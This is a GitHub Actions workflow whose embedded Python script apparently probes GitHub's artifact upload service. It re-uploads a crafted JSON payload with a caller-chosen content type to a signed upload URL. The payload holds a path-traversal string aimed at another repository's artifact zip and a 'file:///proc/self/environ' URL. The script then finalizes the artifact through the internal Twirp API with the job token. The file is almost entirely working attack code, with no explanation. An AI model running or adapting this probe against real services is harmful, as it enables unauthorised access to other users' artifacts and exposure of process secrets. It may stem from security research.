name: disamb85
on:
  workflow_dispatch:
    inputs:
      artname:
        description: artifact name
        default: payload.json
      mimetype:
        description: CreateArtifact mime_type
        default: application/xml
      putct:
        description: PUT Content-Type
        default: text/plain
jobs:
  up:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@v5
      - uses: ./.github/actions/rawup
        with:
          artname: ${{ inputs.artname }}
          mimetype: ${{ inputs.mimetype }}
      - name: re-put with own id and finalize
        env:
          PUTCT: ${{ inputs.putct }}
        run: |
          set -eu
          python3 - <<'PY'
          import json, hashlib, os, urllib.request
          s = json.load(open('/tmp/rawup_state.json'))
          X = s['artifactId']
          repo_str = 'a/../../repos/lemonsour864/cassette/actions/artifacts/%s/zip' % X
          P = json.dumps({"full_name": repo_str,
                          "owner": {"login": "lemonsour864", "avatar_url": "file:///proc/self/environ"},
                          "stargazers_count": 0, "description": "probe"},
                         separators=(',', ':')).encode()
          print('repo_str:', repo_str)
          ct = os.environ['PUTCT']
          req = urllib.request.Request(s['signedUploadUrl'], data=P, method='PUT',
              headers={'Content-Type': ct, 'x-ms-blob-type': 'BlockBlob'})
          print('PUT real:', urllib.request.urlopen(req, timeout=60).status)
          def post(path, obj):
              req = urllib.request.Request(s['base'] + path, data=json.dumps(obj).encode(),
                  headers={'Content-Type': 'application/json', 'Authorization': 'Bearer ' + s['token']}, method='POST')
              return json.load(urllib.request.urlopen(req, timeout=30))
          try:
              r = post('/twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact',
                       {'workflow_run_backend_id': s['runId'], 'workflow_job_run_backend_id': s['jobId'], 'name': s['name'],
                        'size': str(len(P)), 'hash': 'sha256:' + hashlib.sha256(P).hexdigest()})
              print('Finalize2:', json.dumps(r)[:300])
          except Exception as e:
              print('Finalize2 failed (continuing):', e)
          PY
